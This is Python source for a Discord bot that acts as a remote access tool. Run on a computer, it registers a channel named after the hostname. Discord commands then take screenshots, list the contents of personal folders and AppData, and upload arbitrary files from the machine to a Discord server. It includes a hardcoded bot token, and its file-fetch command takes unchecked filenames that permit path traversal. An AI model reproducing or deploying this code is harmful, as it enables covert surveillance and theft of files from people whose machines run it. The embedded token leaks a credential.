import discord
import pyautogui
import psutil
import os
import socket
import time
import asyncio  # Import asyncio for handling timeout
from datetime import datetime
from discord.ext import commands

# Discord bot token
TOKEN = 'MTI5OTEyNDc2OTM0OTgyODY0OA.GBWIzf.joPTTYf3L6GqyRXRu3N2L7mBvH-rm-ETpAQ0qU'  # Replace with your actual bot token
GUILD_ID = 1299125594096668726  # Replace with your Discord server (guild) ID

# Enable intents
intents = discord.Intents.default()
intents.message_content = True  # Allows bot to read and respond to messages
bot = commands.Bot(command_prefix="!", intents=intents)

# Track bot start time for uptime calculation
start_time = time.time()

# Function to take a screenshot
def take_screenshot():
    screenshot = pyautogui.screenshot()
    screenshot_path = "screenshot.png"
    screenshot.save(screenshot_path)
    return screenshot_path

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user}')

    # Get the computer's name
    computer_name = socket.gethostname()

    # Get the guild (Discord server)
    guild = bot.get_guild(GUILD_ID)

    # Check if a channel for this computer already exists
    existing_channel = discord.utils.get(guild.channels, name=computer_name.lower())

    # If the channel doesn't exist, create it
    if not existing_channel:
        await guild.create_text_channel(computer_name.lower())
        print(f"Created channel: {computer_name.lower()}")
    else:
        print(f"Channel {computer_name.lower()} already exists.")

# Command to take a screenshot
@bot.command()
async def screenshot(ctx):
    try:
        # Get the computer's name
        computer_name = socket.gethostname()

        # Get the guild and the channel that corresponds to this computer's name
        guild = bot.get_guild(GUILD_ID)
        user_channel = discord.utils.get(guild.channels, name=computer_name.lower())

        # Ensure that the command is only executed in the correct channel
        if ctx.channel == user_channel:
            screenshot_path = take_screenshot()
            with open(screenshot_path, "rb") as file:
                await user_channel.send("📸 **Here is the screenshot:**", file=discord.File(file, screenshot_path))
            os.remove(screenshot_path)
        else:
            await ctx.send(f"⚠️ Please use this command in your designated channel: {user_channel.mention}")
    except Exception as e:
        await ctx.send(f"❌ **Error:** {e}")

# Command to check system status
@bot.command()
async def status(ctx):
    cpu_percent = psutil.cpu_percent(interval=1)
    memory = psutil.virtual_memory()
    disk = psutil.disk_usage('/')
    await ctx.send(
        f"📊 **System Status:**\n"
        f"💻 **CPU Usage:** `{cpu_percent}%`\n"
        f"🧠 **Memory Usage:** `{memory.percent}%`\n"
        f"💾 **Disk Usage:** `{disk.percent}%`"
    )

# Command to list files in a directory
@bot.command()
async def list_files(ctx):
    try:
        # Directories to list files from
        directories = {
            "Documents": os.path.expanduser("~/Documents"),
            "Desktop": os.path.expanduser("~/Desktop"),
            "Downloads": os.path.expanduser("~/Downloads"),
            "Pictures": os.path.expanduser("~/Pictures"),
            "Music": os.path.expanduser("~/Music"),
            "Videos": os.path.expanduser("~/Videos"),
            "AppData": os.path.expanduser("~/AppData/Local")
        }
        file_path = "file_list.txt"

        # Write file names from each directory to a text file
        with open(file_path, "w") as f:
            for dir_name, dir_path in directories.items():
                f.write(f"--- {dir_name} ---\n")
                if os.path.exists(dir_path):
                    file_list = os.listdir(dir_path)
                    for file_name in file_list:
                        f.write(file_name + "\n")
                else:
                    f.write("Directory not found.\n")
                f.write("\n")  # Separate sections

        # Send the text file in the Discord channel
        with open(file_path, "rb") as file:
            await ctx.send(file=discord.File(file, file_path))

        # Optionally, delete the file after sending it
        os.remove(file_path)

    except Exception as e:
        await ctx.send(f"❌ **Error:** {e}")

# Command to check bot uptime
@bot.command()
async def uptime(ctx):
    current_time = time.time()
    uptime_seconds = int(current_time - start_time)
    hours, remainder = divmod(uptime_seconds, 3600)
    minutes, seconds = divmod(remainder, 60)
    await ctx.send(f"⏱️ **Bot Uptime:** `{hours}h {minutes}m {seconds}s`")

# Command to fetch a file from a specified directory
@bot.command()
async def fetch_file(ctx, directory: str, *, filename: str):
    # Define the base directories
    base_directories = {
        "documents": os.path.expanduser("~/Documents"),
        "desktop": os.path.expanduser("~/Desktop"),
        "downloads": os.path.expanduser("~/Downloads"),
        "pictures": os.path.expanduser("~/Pictures"),
        "music": os.path.expanduser("~/Music"),
        "videos": os.path.expanduser("~/Videos"),
        "appdata": os.path.expanduser("~/AppData/Local")
    }

    # Normalize the directory argument to lowercase
    directory = directory.lower()

    if directory not in base_directories:
        await ctx.send("⚠️ **Invalid directory.** Please choose from: " + ", ".join(base_directories.keys()))
        return

    # Construct the full file path
    dir_path = base_directories[directory]
    file_path = os.path.join(dir_path, filename)

    # Check if the file exists
    if os.path.isfile(file_path):
        await ctx.send(f"📁 **Fetching file:** `{filename}` from `{directory}` directory.", file=discord.File(file_path))
    else:
        await ctx.send(f"❌ **File not found in the specified directory.** Please check the filename and try again.")

# Command to show current time
@bot.command()
async def time(ctx):
    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    await ctx.send(f"🕒 **Current Time:** `{current_time}`")

# Command to shut down the bot with confirmation
@bot.command()
async def shutdown(ctx):
    confirmation_message = await ctx.send("⚠️ **Are you sure you want to shut down the bot?**")
    await confirmation_message.add_reaction("✅")  # Green check mark
    await confirmation_message.add_reaction("❌")  # Red cross mark

    def check(reaction, user):
        return user == ctx.author and str(reaction.emoji) in ["✅", "❌"]

    try:
        reaction, user = await bot.wait_for('reaction_add', timeout=30.0, check=check)

        if str(reaction.emoji) == "✅":
            await ctx.send("🔴 **Now shutting down the bot.**")
            await bot.close()
        elif str(reaction.emoji) == "❌":
            await ctx.send("✅ **Shutdown cancelled.**")

    except asyncio.TimeoutError:
        await ctx.send("⏰ **Shutdown confirmation timed out.** Please try again.")

# Start the bot
bot.run(TOKEN)
